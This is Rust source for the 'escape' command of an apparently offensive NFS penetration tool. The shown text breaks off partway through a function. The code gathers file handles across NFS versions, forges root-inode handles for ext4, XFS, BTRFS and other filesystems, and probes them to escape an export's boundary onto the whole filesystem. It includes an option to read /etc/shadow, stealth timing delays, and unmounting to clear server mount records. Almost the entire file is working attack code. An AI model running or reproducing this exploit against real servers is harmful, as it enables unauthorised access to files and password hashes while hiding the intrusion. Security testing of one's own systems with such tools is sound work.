//! Export escape: seven-phase pipeline to break out of NFS export boundaries.
//!
//! Phase 1 gathers every reachable file handle from every protocol version and source.
//! Phase 2 constructs plausible filesystem-top handles from each seed (pure computation).
//! Phase 3 probes every candidate against the server across all protocol versions.
//! Phase 4 deduplicates and filters out handles the operator already has.
//! Phase 4b detects whether a tree-top is the server's root filesystem.
//! Phase 5 scores and annotates each tree-top for ranking.
//! Phase 6 reports the results to the operator.
//!
//! Two modes:
//!   - **Full** (default, `escape <HOST>`): discovers all exports, uses all 15 handle
//!     sources, brute-force scan, multi-version probing.
//!   - **Fast** (`--fast`, requires `HOST:/export`): one export, one version, no
//!     brute-force, ~10-80 RPCs.
//!
//! Most NFS exports trust the file handle the client presents (RFC 1094
//! S2.3.3 -- handles are bearer tokens). When the server does not validate
//! that a handle's inode falls inside the export's subtree, an attacker
//! can construct a handle pointing at the filesystem root (ext4 inode 2,
//! XFS inode 128, BTRFS subvolume 256, etc.) and read/write anything on
//! the underlying filesystem.

use std::collections::HashSet;
use std::net::SocketAddr;
use std::sync::Arc;
use std::time::Duration;

use clap::Parser;
use colored::Colorize as _;

use crate::cli::probe::{build_gid_list, make_client_with_hostname, make_mount_client, make_v2_client_with_hostname, parse_addr_with_port};
use crate::cli::{GlobalOpts, H_BEHAVIOR, H_OUTPUT, H_TARGET};
use crate::engine::credential::credential_ladder_with;
use crate::engine::escape::{AccessRank, AnnotatedTreeTop, DiscoveredExport, EscapeCandidate, EscapeSeed, EscapeStats, PipelineConfig, ROOTFS_THRESHOLD, VerifiedTreeTop, construct_candidates, dedup_and_filter, dedup_by_filesystem, rootfs_score, score_and_annotate};
use crate::proto::auth::{AuthSys, Credential};
use crate::proto::circuit::CircuitBreaker;
use crate::proto::conn::ReconnectStrategy;
use crate::proto::mount::NfsMountClient;
use crate::proto::nfs3::types::FileHandle;
use crate::proto::nfs3::{Nfs3Client, PooledNfs3 as _};
use crate::proto::pool::{ConnectionPool, PoolKey};
use crate::proto::transport::PooledTransport;
use crate::util::stealth::StealthConfig;

/// Escape an export to the filesystem root via subtree_check bypass.
///
/// Uses a seven-phase pipeline: gather seeds from every protocol version and
/// source, construct all plausible filesystem-top handles, probe them against
/// the server, deduplicate, detect rootfs, score, and report.
///
/// Strategy (automatic, no flags needed):
///   1. Discover exports and acquire handles from every version (MOUNT v3/v1, NFSv4).
///   2. Walk upward from every handle via LOOKUP ".." and LOOKUPP.
///   3. Construct root-inode handles (ext4, XFS, BTRFS, ZFS, etc.) from each seed.
///   4. Probe all candidates via GETATTR, confirm tree-tops via ".." == self.
///   5. Score and report every confirmed escape handle.
///
/// Examples:
///   nfswolf escape 192.168.1.10                         # all exports
///   nfswolf escape 192.168.1.10:/srv                    # scope to one export
///   nfswolf escape --fast 192.168.1.10:/srv             # quick single-export
///   nfswolf escape 192.168.1.10 --json > escape.json    # machine-readable
///   nfswolf escape 192.168.1.10 --read-shadow           # post-escape read
#[derive(Parser)]
pub(crate) struct EscapeArgs {
    /// Target host with optional :/export suffix (e.g. 10.0.0.5:/srv)
    #[arg(help_heading = H_TARGET, value_name = "TARGET")]
    pub target: String,

    /// Export path (alternative to host:/export in the positional target)
    #[arg(short = 'e', long, value_name = "PATH", help_heading = H_TARGET)]
    pub export: Option<String>,

    /// Number of BTRFS subvolume IDs to try (starting at 256)
    #[arg(long, default_value_t = DEFAULT_BTRFS_SUBVOLS, value_name = "N", help_heading = H_BEHAVIOR)]
    pub btrfs_subvols: u32,

    /// Inode scan depth for the fallback brute-force pass.
    /// The root inode is always within the first 200 inodes on any Linux
    /// filesystem, so the default covers all practical cases.
    #[arg(long, default_value_t = DEFAULT_MAX_ROOT_SCAN, value_name = "N", help_heading = H_BEHAVIOR)]
    pub max_root_scan: u32,

    /// Reduced pipeline: one export, one version, no brute-force, no
    /// children, no Phase 1a/1c. Requires host:/export.
    #[arg(long, help_heading = H_BEHAVIOR)]
    pub fast: bool,

    /// Output results as JSON to stdout
    #[arg(long, help_heading = H_OUTPUT)]
    pub json: bool,

    /// Read /etc/shadow from the best OS-ESCAPE handle after reporting
    #[arg(long, help_heading = H_BEHAVIOR)]
    pub read_shadow: bool,

    /// Show all handles including duplicates across exports. By default,
    /// results are collapsed to one handle per filesystem (dedup by UUID +
    /// inode). Use --all-handles when you need every distinct export path
    /// because they may carry different permissions (ro vs rw, root_squash
    /// vs no_root_squash).
    #[arg(long, help_heading = H_OUTPUT)]
    pub all_handles: bool,
}

/// Default BTRFS subvolume scan count. Shared with `scan --auto-escape` so the
/// auto pass uses the same depth as a manual `escape` invocation.
pub(crate) const DEFAULT_BTRFS_SUBVOLS: u32 = 16;

/// Default inode-scan depth for the escape fallback pass. The root inode is
/// always within the first 200 inodes on any Linux filesystem. Shared with
/// `scan --auto-escape`.
pub(crate) const DEFAULT_MAX_ROOT_SCAN: u32 = 200;

/// Safety cap on upward traversal depth (LOOKUP ".." / LOOKUPP chains).
const MAX_TRAVERSAL_DEPTH: usize = 64;

/// Maximum number of children to enumerate per export per version.
const MAX_CHILDREN_PER_EXPORT: usize = 10;

/// Combined cap on novel DUMP paths (Channels 4+5 of Phase 1a).
const MAX_DUMP_NOVEL_PATHS: usize = 10;

/// Timeout for individual NFSv4 RPC calls on the direct (pool-free) client.
/// Prevents hangs against half-open firewalls that accept TCP but never reply.
const V4_RPC_TIMEOUT: Duration = Duration::from_secs(5);

// --- Active version tracking for fast mode ---

/// The NFS version that succeeded in Phase 1b fast-mode probing.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ActiveVersion {
    V3,
    V2,
    V4,
}

// =============================================================================
// Entry points
// =============================================================================

/// Run the escape subcommand (full or fast mode).
pub(crate) async fn run(args: EscapeArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
    let target = crate::cli::target::parse(&args.target, args.export.as_deref(), None, args.fast)?;
    let host = target.host.to_string();
    let export = target.export().unwrap_or("/").to_owned();

    if args.fast && export == "/" && args.export.is_none() {
        anyhow::bail!("--fast requires an export path (e.g. escape --fast host:/srv)");
    }

    let config = PipelineConfig { fast: args.fast, btrfs_subvols: args.btrfs_subvols, max_root_scan: args.max_root_scan, json: args.json, read_shadow: args.read_shadow, all_handles: args.all_handles };

    let addr = parse_addr_with_port(&host, globals.nfs_port)?;
    let stealth = StealthConfig::new(globals.delay, globals.jitter);
    let mount = make_mount_client(globals);
    let nfs_port = globals.nfs_port.unwrap_or(2049);

    // --- Phase 1: Gather seeds ---
    if !globals.quiet && !config.json {
        eprintln!("{}", crate::output::status_info(&format!("Escaping {host} ({})", if config.fast { "fast mode" } else { "comprehensive" })));
    }

    let (exports, seeds, known_boundaries) = if config.fast { phase1_gather_seeds_fast(&host, &export, addr, &mount, &stealth, nfs_port, globals).await? } else { phase1_gather_seeds_full(&host, &export, addr, &mount, &stealth, nfs_port, globals).await? };

    if seeds.is_empty() {
        if config.json {
            println!("{}", serde_json::json!({"host": host, "exports": [], "stats": {"seeds": 0}, "results": [], "error": "no seeds acquired"}));
        } else {
            eprintln!("{}", crate::output::status_err("No seed handles acquired from any source -- export may not exist or server is unreachable"));
        }
        crate::cli::emit_replay(globals);
        return Ok(());
    }

    if !globals.quiet && !config.json {
        eprintln!("{}", crate::output::status_info(&format!("{} unique seed handle(s) acquired", seeds.len())));
    }

    // --- Phase 2: Construct candidates ---
    let (candidates, candidates_before_dedup) = construct_candidates(&seeds, &config);

    if !globals.quiet && !config.json {
        eprintln!("{}", crate::output::status_info(&format!("{} candidates constructed (deduped from {})", candidates.len(), candidates_before_dedup)));
    }

    // --- Phase 3: Probe candidates ---
    let active_version = if config.fast {
        seeds.first().and_then(|s| match s.nfs_version {
            Some(3) => Some(ActiveVersion::V3),
            Some(2) => Some(ActiveVersion::V2),
            Some(4) => Some(ActiveVersion::V4),
            _ => None,
        })
    } else {
        None
    };

    let tree_tops = probe_candidates(&candidates, addr, &export, &stealth, nfs_port, globals, active_version).await;

    if !globals.quiet && !config.json {
        eprintln!("{}", crate::output::status_info(&format!("{} tree-top(s) confirmed", tree_tops.len())));
    }

    // --- Phase 4: Dedup and filter ---
    let confirmed_count = tree_tops.len();
    let mut filtered = dedup_and_filter(tree_tops, &known_boundaries);
    let filtered_count = confirmed_count - filtered.len();

    // --- Phase 4b: Rootfs detection ---
    rootfs_detection(&mut filtered, addr, &export, &stealth, nfs_port, globals).await;

    // --- Phase 5: Score and annotate ---
    let annotated = score_and_annotate(filtered);
    let annotated = if config.all_handles { annotated } else { dedup_by_filesystem(annotated) };

    let stats = EscapeStats { seeds: seeds.len(), candidates: candidates.len(), candidates_before_dedup, tree_tops_confirmed: confirmed_count, tree_tops_filtered: filtered_count, tree_tops_reported: annotated.len() };

    // --- Phase 6: Report ---
    if config.json {
        report_json(&host, &exports, &stats, &annotated, &config, addr, &export, &stealth, nfs_port, globals).await;
    } else {
        report_console(&host, &exports, &stats, &annotated);

        if config.read_shadow {
            read_shadow(&annotated, addr, &export, &stealth, nfs_port, globals).await;
        }
    }

    crate::cli::emit_replay(globals);
    Ok(())
}

/// Run the escape pipeline in fast mode for a single host:export.
///
/// Returns the best `AnnotatedTreeTop`, if any escape succeeded. Called by
/// `shell escape-root` and `scan --auto-escape` instead of the old
/// `find_escape_any()`.
pub(crate) async fn run_fast(host: &str, export: &str, globals: &GlobalOpts) -> anyhow::Result<Option<AnnotatedTreeTop>> {
    let addr = parse_addr_with_port(host, globals.nfs_port)?;
    let stealth = StealthConfig::new(globals.delay, globals.jitter);
    let mount = make_mount_client(globals);
    let nfs_port = globals.nfs_port.unwrap_or(2049);

    let config = PipelineConfig { fast: true, btrfs_subvols: DEFAULT_BTRFS_SUBVOLS, max_root_scan: DEFAULT_MAX_ROOT_SCAN, json: false, read_shadow: false, all_handles: false };

    // Phase 1
    let (_exports, seeds, known_boundaries) = phase1_gather_seeds_fast(host, export, addr, &mount, &stealth, nfs_port, globals).await?;
    if seeds.is_empty() {
        return Ok(None);
    }

    // Phase 2
    let (candidates, _) = construct_candidates(&seeds, &config);

    // Determine active version from first seed
    let active_version = seeds.first().and_then(|s| match s.nfs_version {
        Some(3) => Some(ActiveVersion::V3),
        Some(2) => Some(ActiveVersion::V2),
        Some(4) => Some(ActiveVersion::V4),
        _ => None,
    });

    // Phase 3
    let tree_tops = probe_candidates(&candidates, addr, export, &stealth, nfs_port, globals, active_version).await;

    // Phase 4
    let mut filtered = dedup_and_filter(tree_tops, &known_boundaries);

    // Phase 4b
    rootfs_detection(&mut filtered, addr, export, &stealth, nfs_port, globals).await;

    // Phase 5
    let annotated = score_and_annotate(filtered);

    Ok(annotated.into_iter().next())
}

// =============================================================================
// Phase 1: Gather seeds
// =============================================================================

/// Phase 1 for fast mode: single export, single version, upward traversal only.
async fn phase1_gather_seeds_fast(host: &str, export: &str, addr: SocketAddr, mount: &NfsMountClient, stealth: &StealthConfig, nfs_port: u16, globals: &GlobalOpts) -> anyhow::Result<(Vec<DiscoveredExport>, Vec<EscapeSeed>, HashSet<Vec<u8>>)> {
    let exports = vec![DiscoveredExport { path: export.to_owned(), sources: vec!["operator"] }];

    let mut seeds: Vec<EscapeSeed> = Vec::new();
    let mut seen: HashSet<Vec<u8>> = HashSet::new();
    let mut known_boundaries: HashSet<Vec<u8>> = HashSet::new();
    let mut active_version: Option<ActiveVersion> = None;

    // Phase 1b fast: try v3 -> v2 -> v4, stop at first success
    stealth.wait().await;
    if let Ok(mnt) = mount.mount(addr, export).await {
        let label = format!("MOUNT v3 {export}");
        tracing::debug!(len = mnt.handle.len(), "MOUNT v3 succeeded");
        let _ = known_boundaries.insert(mnt.handle.as_bytes().to_vec());
        if seen.insert(mnt.handle.as_bytes().to_vec()) {
            seeds.push(EscapeSeed { handle: mnt.handle, source: label, is_root: true, nfs_version: Some(3) });
        }
        active_version = Some(ActiveVersion::V3);
    }

    if active_version.is_none() {
        stealth.wait().await;
        if let Ok(mnt) = mount.mount_v1(addr, export).await {
            let label = format!("MOUNT v1 {export}");
            tracing::debug!(len = mnt.handle.len(), "MOUNT v1 succeeded");
            let _ = known_boundaries.insert(mnt.handle.as_bytes().to_vec());
            if seen.insert(mnt.handle.as_bytes().to_vec()) {
                seeds.push(EscapeSeed { handle: mnt.handle, source: label, is_root: true, nfs_version: Some(2) });
            }
            active_version = Some(ActiveVersion::V2);
        }
    }

    if active_version.is_none()
        && let Some(fh) = acquire_v4_lookup_handle(host, export, globals).await
    {
        let label = format!("NFSv4 LOOKUP {export}");
        tracing::debug!(len = fh.len(), "NFSv4 LOOKUP succeeded");
        let _ = known_boundaries.insert(fh.as_bytes().to_vec());
        if seen.insert(fh.as_bytes().to_vec()) {
            seeds.push(EscapeSeed { handle: fh, source: label, is_root: true, nfs_version: Some(4) });
        }
        active_version = Some(ActiveVersion::V4);
    }

    let Some(version) = active_version else {
        anyhow::bail!("could not mount export via any NFS version -- verify the export path and server availability");
    };

    // Phase 1d fast: upward traversal using the active version only
    let traversal_seeds: Vec<EscapeSeed> = seeds.iter().filter(|s| s.is_root).cloned().collect();

    for seed in &traversal_seeds {
        match version {
            ActiveVersion::V3 => {
                let v3 = make_v3_client(addr, export, stealth.clone(), nfs_port, globals);
                upward_chain_v3(&v3, &seed.handle, &seed.source, &mut seeds, &mut seen, stealth).await;
            },
            ActiveVersion::V2 => {
                let (_, _, v2) = make_v2_client_with_hostname(addr, export, globals.uid, globals.gid, &globals.aux_gids, stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
                upward_chain_v2(&v2, &seed.handle, &seed.source, &mut seeds, &mut seen, stealth).await;
            },
            ActiveVersion::V4 => {
                // Both v4 LOOKUPP and v4 LOOKUP ".." chains
                if let Ok(mut client) = make_v4_direct_client(addr, globals).await {
                    client = client.with_stealth(stealth.clone());
                    upward_chain_v4_lookupp(&mut client, &seed.handle, &seed.source, &mut seeds, &mut seen).await;
                }
                if let Ok(mut client) = make_v4_direct_client(addr, globals).await {
                    client = client.with_stealth(stealth.clone());
                    upward_chain_v4_lookup_dotdot(&mut client, &seed.handle, &seed.source, &mut seeds, &mut seen).await;
                }
            },
        }
    }

    // Unmount for stealth cleanup (best-effort, both v3 and v1 rmtab entries)
    drop(mount.unmount(addr, export).await);
    drop(mount.unmount_v1(addr, export).await);

    Ok((exports, seeds, known_boundaries))
}

/// Phase 1 for full mode: all exports, all versions, all sources.
async fn phase1_gather_seeds_full(host: &str, export: &str, addr: SocketAddr, mount: &NfsMountClient, stealth: &StealthConfig, nfs_port: u16, globals: &GlobalOpts) -> anyhow::Result<(Vec<DiscoveredExport>, Vec<EscapeSeed>, HashSet<Vec<u8>>)> {
    // Phase 1a: Discover exports
    let mut exports = discover_exports(host, addr, mount, stealth, globals).await;

    // Force-insert the operator-specified export if present
    let has_explicit_export = export != "/";
    if has_explicit_export && !exports.iter().any(|e| e.path == export) {
        exports.push(DiscoveredExport { path: export.to_owned(), sources: vec!["operator"] });
    }

    if exports.is_empty() {
        anyhow::bail!("no exports discovered on target -- use host:/export to specify an export manually");
    }

    if !globals.quiet {
        eprintln!("{}", crate::output::status_info(&format!("{} export(s) discovered", exports.len())));
    }

    let mut seeds: Vec<EscapeSeed> = Vec::new();
    let mut seen: HashSet<Vec<u8>> = HashSet::new();
    let mut known_boundaries: HashSet<Vec<u8>> = HashSet::new();

    // Phase 1b: Acquire handles from each export
    let v3 = make_v3_client(addr, export, stealth.clone(), nfs_port, globals);

    for exp in &exports {
        acquire_handles_for_export(host, &exp.path, addr, mount, &v3, stealth, nfs_port, globals, &mut seeds, &mut seen, &mut known_boundaries).await;
    }

    // Phase 1c: Protocol-specific handle sources
    protocol_singles(host, addr, stealth, nfs_port, globals, &mut seeds, &mut seen).await;

    // Phase 1d: Upward traversal (4 chains per is_root handle)
    // Snapshot is_root seeds to avoid borrow conflict during iteration
    let traversal_starts: Vec<EscapeSeed> = seeds.iter().filter(|s| s.is_root).cloned().collect();

    for seed in &traversal_starts {
        // v3 LOOKUP ".." chain
        upward_chain_v3(&v3, &seed.handle, &seed.source, &mut seeds, &mut seen, stealth).await;

        // v2 LOOKUP ".." chain
        {
            let (_, _, v2) = make_v2_client_with_hostname(addr, export, globals.uid, globals.gid, &globals.aux_gids, stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
            upward_chain_v2(&v2, &seed.handle, &seed.source, &mut seeds, &mut seen, stealth).await;
        }

        // v4 LOOKUPP chain
        if let Ok(mut v4_client) = make_v4_direct_client(addr, globals).await {
            v4_client = v4_client.with_stealth(stealth.clone());
            upward_chain_v4_lookupp(&mut v4_client, &seed.handle, &seed.source, &mut seeds, &mut seen).await;
        }

        // v4 LOOKUP ".." chain
        if let Ok(mut v4_client) = make_v4_direct_client(addr, globals).await {
            v4_client = v4_client.with_stealth(stealth.clone());
            upward_chain_v4_lookup_dotdot(&mut v4_client, &seed.handle, &seed.source, &mut seeds, &mut seen).await;
        }
    }

    // Unmount all exports for stealth cleanup (best-effort, both v3 and v1 rmtab entries)
    for exp in &exports {
        drop(mount.unmount(addr, &exp.path).await);
        drop(mount.unmount_v1(addr, &exp.path).await);
    }

    Ok((exports, seeds, known_boundaries))
}

// --- Phase 1a: Discover exports ---

/// Five independent discovery channels, merged into one deduplicated export list.
async fn discover_exports(host: &str, addr: SocketAddr, mount: &NfsMountClient, stealth: &StealthConfig, globals: &GlobalOpts) -> Vec<DiscoveredExport> {
    let mut export_map: std::collections::HashMap<String, Vec<&'static str>> = std::collections::HashMap::new();

    // Channel 1: MOUNT v3 EXPORT
    stealth.wait().await;
    if let Ok(exps) = mount.list_exports(addr).await {
        for e in &exps {
            export_map.entry(e.path.clone()).or_default().push("MOUNT v3 EXPORT");
        }
    } else {
        tracing::warn!("MOUNT v3 EXPORT failed");
    }

    // Channel 2: MOUNT v1 EXPORT
    stealth.wait().await;
    if let Ok(exps) = mount.list_exports_v1(addr).await {
        for e in &exps {
            export_map.entry(e.path.clone()).or_default().push("MOUNT v1 EXPORT");
        }
    } else {
        tracing::warn!("MOUNT v1 EXPORT failed");
    }

    // Channel 3: NFSv4 pseudo-FS walk
    {
        let v4_seeds = gather_v4_export_seeds(host, globals).await;
        for (path, _fh) in &v4_seeds {
            export_map.entry(path.clone()).or_default().push("NFSv4 pseudo-FS");
        }
    }

    // Channel 4: MOUNT v3 DUMP
    let existing_count = export_map.len();
    stealth.wait().await;
    let mut dump_novel = 0usize;
    if let Ok(clients) = mount.dump_clients(addr).await {
        for client_entry in &clients {
            if dump_novel >= MAX_DUMP_NOVEL_PATHS {
                break;
            }
            if !export_map.contains_key(&client_entry.directory) {
                export_map.entry(client_entry.directory.clone()).or_default().push("MOUNT v3 DUMP");
                dump_novel += 1;
            }
        }
    } else {
        tracing::warn!("MOUNT v3 DUMP failed");
    }

    // Channel 5: MOUNT v1 DUMP
    stealth.wait().await;
    if let Ok(clients) = mount.dump_clients_v1(addr).await {
        for client_entry in &clients {
            if dump_novel >= MAX_DUMP_NOVEL_PATHS {
                break;
            }
            if !export_map.contains_key(&client_entry.directory) {
                export_map.entry(client_entry.directory.clone()).or_default().push("MOUNT v1 DUMP");
                dump_novel += 1;
            }
        }
    } else {
        tracing::warn!("MOUNT v1 DUMP failed");
    }

    let _ = existing_count; // suppress unused

    export_map.into_iter().map(|(path, sources)| DiscoveredExport { path, sources }).collect()
}

// --- Phase 1b: Acquire handles from each export ---

/// Acquire boundary + child handles for one export across all three versions.
#[expect(clippy::cognitive_complexity, reason = "three-version handle acquisition with children from each version")]
async fn acquire_handles_for_export(host: &str, export_path: &str, addr: SocketAddr, mount: &NfsMountClient, v3: &Nfs3Client, stealth: &StealthConfig, nfs_port: u16, globals: &GlobalOpts, seeds: &mut Vec<EscapeSeed>, seen: &mut HashSet<Vec<u8>>, known_boundaries: &mut HashSet<Vec<u8>>) {
    // MOUNT v3 MNT
    stealth.wait().await;
    let v3_handle = match mount.mount(addr, export_path).await {
        Ok(mnt) => {
            let label = format!("MOUNT v3 {export_path}");
            let _ = known_boundaries.insert(mnt.handle.as_bytes().to_vec());
            if seen.insert(mnt.handle.as_bytes().to_vec()) {
                seeds.push(EscapeSeed { handle: mnt.handle.clone(), source: label, is_root: true, nfs_version: Some(3) });
            }
            Some(mnt.handle)
        },
        Err(e) => {
            tracing::debug!(export = export_path, "MOUNT v3 failed: {e}");
            None
        },
    };

    // MOUNT v1 MNT
    stealth.wait().await;
    let v1_handle = match mount.mount_v1(addr, export_path).await {
        Ok(mnt) => {
            let label = format!("MOUNT v1 {export_path}");
            let _ = known_boundaries.insert(mnt.handle.as_bytes().to_vec());
            if seen.insert(mnt.handle.as_bytes().to_vec()) {
                seeds.push(EscapeSeed { handle: mnt.handle.clone(), source: label, is_root: true, nfs_version: Some(2) });
            }
            Some(mnt.handle)
        },
        Err(e) => {
            tracing::debug!(export = export_path, "MOUNT v1 failed: {e}");
            None
        },
    };

    // NFSv4 LOOKUP
    let v4_handle = if let Some(fh) = acquire_v4_lookup_handle(host, export_path, globals).await {
        let label = format!("NFSv4 LOOKUP {export_path}");
        let _ = known_boundaries.insert(fh.as_bytes().to_vec());
        if seen.insert(fh.as_bytes().to_vec()) {
            seeds.push(EscapeSeed { handle: fh.clone(), source: label, is_root: true, nfs_version: Some(4) });
        }
        Some(fh)
    } else {
        tracing::debug!(export = export_path, "NFSv4 LOOKUP failed");
        None
    };

    // Children from v3 export boundary (READDIRPLUS, first 10)
    if let Some(ref v3_fh) = v3_handle {
        stealth.wait().await;
        if let Ok(page) = v3.list_dir_page(v3_fh, 0, nfs_v3::wire::cookieverf3::default()).await {
            let mut count = 0usize;
            for entry in &page.entries {
                if count >= MAX_CHILDREN_PER_EXPORT {
                    break;
                }
                if entry.name == "." || entry.name == ".." {
                    continue;
                }
                if let Some(ref child_fh) = entry.handle {
                    let label = format!("READDIRPLUS v3 child '{}' from {export_path}", entry.name);
                    if seen.insert(child_fh.as_bytes().to_vec()) {
                        seeds.push(EscapeSeed { handle: child_fh.clone(), source: label, is_root: false, nfs_version: Some(3) });
                    }
                    count += 1;
                }
            }
        }
    }

    // Children from v2 export boundary (READDIR + LOOKUP, first 10)
    if let Some(ref v1_fh) = v1_handle {
        let (_, _, v2_client) = make_v2_client_with_hostname(addr, export_path, globals.uid, globals.gid, &globals.aux_gids, stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
        let v2_fh = nfs_v2::wire::Nfs2FileHandle::from_bytes(v1_fh.as_bytes());
        stealth.wait().await;
        if let Ok(entries) = v2_client.readdir(&v2_fh, 0, 8192).await {
            let mut count = 0usize;
            for entry in &entries {
                if count >= MAX_CHILDREN_PER_EXPORT {
                    break;
                }
                if entry.name == "." || entry.name == ".." {
                    continue;
                }
                stealth.wait().await;
                if let Ok((child, _)) = v2_client.lookup(&v2_fh, &entry.name).await {
                    let child_fh = FileHandle::from_bytes(&child.0);
                    let label = format!("READDIR+LOOKUP v2 child '{}' from {export_path}", entry.name);
                    if seen.insert(child_fh.as_bytes().to_vec()) {
                        seeds.push(EscapeSeed { handle: child_fh, source: label, is_root: false, nfs_version: Some(2) });
                    }
                    count += 1;
                }
            }
        }
    }

    // Children from v4 handle (READDIR + LOOKUP, first 10)
    if let Some(ref v4_fh) = v4_handle {
        let pooled_v4 = make_v4_pooled_client(addr, export_path, stealth.clone(), nfs_port, globals);
        if let Ok(dir_names) = pooled_v4.list_dir(v4_fh.as_bytes()).await {
            let mut count = 0usize;
            for name in &dir_names {
                if count >= MAX_CHILDREN_PER_EXPORT {
                    break;
                }
                if name == "." || name == ".." {
                    continue;
                }
                if let Ok((child_fh, _)) = pooled_v4.lookup(v4_fh.as_bytes(), name).await {
                    let fh = FileHandle::from_bytes(&child_fh);
                    let label = format!("READDIR+LOOKUP v4 child '{name}' from {export_path}");
                    if seen.insert(fh.as_bytes().to_vec()) {
                        seeds.push(EscapeSeed { handle: fh, source: label, is_root: false, nfs_version: Some(4) });
                    }
                    count += 1;
                }
            }
        }
    }
}

// --- Phase 1c: Protocol-specific handle sources ---

/// Single-shot sources that don't iterate over exports or chain upward.
async fn protocol_singles(host: &str, addr: SocketAddr, stealth: &StealthConfig, _nfs_port: u16, globals: &GlobalOpts, seeds: &mut Vec<EscapeSeed>, seen: &mut HashSet<Vec<u8>>) {
    // PUTROOTFH + GETFH (NFSv4 pseudo-root)
    if let Ok(mut client) = make_v4_direct_client(addr, globals).await {
        client = client.with_stealth(stealth.clone());
        if let Ok(Ok(root_fh)) = tokio::time::timeout(V4_RPC_TIMEOUT, client.get_root_fh()).await {
            let fh = FileHandle::from_bytes(&root_fh);
            if seen.insert(fh.as_bytes().to_vec()) {
                seeds.push(EscapeSeed { handle: fh, source: "PUTROOTFH v4 (pseudo-root)".to_owned(), is_root: true, nfs_version: Some(4) });
            }
        }

        // PUTPUBFH + GETFH (WebNFS public v4)
        {
            use crate::proto::nfs4::types::{ArgOp, ResOpData};
            let ops = vec![ArgOp::Putpubfh, ArgOp::Getfh];
            if let Ok(Ok(res)) = tokio::time::timeout(V4_RPC_TIMEOUT, client.compound(ops)).await
                && res.status == 0
                && let Some(fh_data) = res.results.iter().find_map(|op| if let ResOpData::Fh(fh) = &op.data { Some(fh.clone()) } else { None })
            {
                let fh = FileHandle::from_bytes(&fh_data);
                if seen.insert(fh.as_bytes().to_vec()) {
                    seeds.push(EscapeSeed { handle: fh, source: "WebNFS public v4 (PUTPUBFH)".to_owned(), is_root: true, nfs_version: Some(4) });
                }
            }
        }
    }

    // WebNFS public v3: zero-length handle, test via LOOKUP "."
    {
        let (_, _, v3_client) = make_client_with_hostname(addr, "/", 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
        let public_v3 = FileHandle::from_bytes(&[]);
        stealth.wait().await;
        if v3_client.resolve(&public_v3, ".").await.is_ok() && seen.insert(Vec::new()) {
            seeds.push(EscapeSeed { handle: public_v3, source: "WebNFS public v3".to_owned(), is_root: true, nfs_version: Some(3) });
        }
    }

    // WebNFS public v2: all-zero 32 bytes, test via GETATTR
    {
        let (_, _, v2_client) = make_v2_client_with_hostname(addr, "/", 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
        let public_v2 = nfs_v2::wire::Nfs2FileHandle([0u8; 32]);
        stealth.wait().await;
        if v2_client.getattr(&public_v2).await.is_ok() {
            let fh = FileHandle::from_bytes(&[0u8; 32]);
            if seen.insert(fh.as_bytes().to_vec()) {
                seeds.push(EscapeSeed { handle: fh, source: "WebNFS public v2".to_owned(), is_root: true, nfs_version: Some(2) });
            }
        }
    }

    // NFSPROC_ROOT v2
    {
        let (_, _, v2_client) = make_v2_client_with_hostname(addr, "/", 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
        stealth.wait().await;
        if let Ok(Some(root_fh)) = v2_client.root().await {
            let fh = FileHandle::from_bytes(&root_fh.0);
            if fh.as_bytes().iter().any(|&b| b != 0) && seen.insert(fh.as_bytes().to_vec()) {
                seeds.push(EscapeSeed { handle: fh, source: "NFSPROC_ROOT v2".to_owned(), is_root: true, nfs_version: Some(2) });
            }
        }
    }

    let _ = host; // used for logging context if needed
}

// --- Phase 1d: Upward traversal chains ---

/// v3 LOOKUP ".." chain: resolve ".." repeatedly until handle stabilizes.
async fn upward_chain_v3(client: &Nfs3Client, start: &FileHandle, source: &str, seeds: &mut Vec<EscapeSeed>, seen: &mut HashSet<Vec<u8>>, stealth: &StealthConfig) {
    let mut current = start.clone();
    for depth in 1..=MAX_TRAVERSAL_DEPTH {
        stealth.wait().await;
        let Ok((parent, _)) = client.resolve(&current, "..").await else { break };
        if parent.as_bytes() == current.as_bytes() {
            break; // tree-top reached
        }
        let label = format!("LOOKUP '..' v3 from {source} (depth {depth})");
        if !seen.insert(parent.as_bytes().to_vec()) {
            break; // already in pool
        }
        seeds.push(EscapeSeed { handle: parent.clone(), source: label, is_root: true, nfs_version: Some(3) });
        current = parent;
    }
}

/// v2 LOOKUP ".." chain: truncate/pad to 32 bytes and resolve ".." repeatedly.
async fn upward_chain_v2(client: &crate::proto::nfs2::Nfs2Client, start: &FileHandle, source: &str, seeds: &mut Vec<EscapeSeed>, seen: &mut HashSet<Vec<u8>>, stealth: &StealthConfig) {
    let mut current_v2 = nfs_v2::wire::Nfs2FileHandle::from_bytes(start.as_bytes());
    for depth in 1..=MAX_TRAVERSAL_DEPTH {
        stealth.wait().await;
        let Ok((parent, _)) = client.lookup(&current_v2, "..").await else { break };
        if parent.0 == current_v2.0 {
            break; // tree-top reached
        }
        let fh = FileHandle::from_bytes(&parent.0);
        let label = format!("LOOKUP '..' v2 from {source} (depth {depth})");
        if !seen.insert(fh.as_bytes().to_vec()) {
            break; // already in pool
        }
        seeds.push(EscapeSeed { handle: fh, source: label, is_root: true, nfs_version: Some(2) });
        current_v2 = parent;
    }
}

/// v4 LOOKUPP chain: PUTFH + LOOKUPP + GETFH repeated.
async fn upward_chain_v4_lookupp(client: &mut crate::proto::nfs4::compound::Nfs4DirectClient, start: &FileHandle, source: &str, seeds: &mut Vec<EscapeSeed>, seen: &mut HashSet<Vec<u8>>) {
    use crate::proto::nfs4::types::{ArgOp, ResOpData};

    let mut current = start.as_bytes().to_vec();
    for depth in 1..=MAX_TRAVERSAL_DEPTH {
        let ops = vec![ArgOp::Putfh(current.clone()), ArgOp::Lookupp, ArgOp::Getfh];
        let Ok(Ok(res)) = tokio::time::timeout(V4_RPC_TIMEOUT, client.compound(ops)).await else { break };
        if res.status != 0 {
            break;
        }
        let Some(parent) = res.results.iter().find_map(|op| if let ResOpData::Fh(fh) = &op.data { Some(fh.clone()) } else { None }) else { break };
        if parent == current {
            break; // tree-top reached
        }
